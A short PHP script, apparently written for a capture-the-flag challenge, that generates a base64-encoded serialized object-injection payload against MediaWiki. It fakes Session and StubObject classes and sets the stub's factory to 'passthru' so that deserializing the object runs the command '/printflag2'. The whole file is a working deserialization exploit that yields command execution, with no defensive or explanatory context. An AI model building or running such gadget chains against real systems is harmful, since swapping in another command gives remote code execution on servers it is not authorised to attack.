<?php
namespace MediaWiki\Session {
	class Session {
		public $backend;
	}
}

namespace MediaWiki\StubObject {
	class StubObject {
		public $global;
		public $factory;
		public $params;
	}
}

namespace {
	$stub = new \MediaWiki\StubObject\StubObject();
	$stub->global = "wgUser";
	$stub->factory = "passthru";
	$stub->params = array("/printflag2");

	$session = new \MediaWiki\Session\Session();
	$session->backend = $stub;

	$payload = base64_encode(serialize($session));
	echo $payload;
}
?>
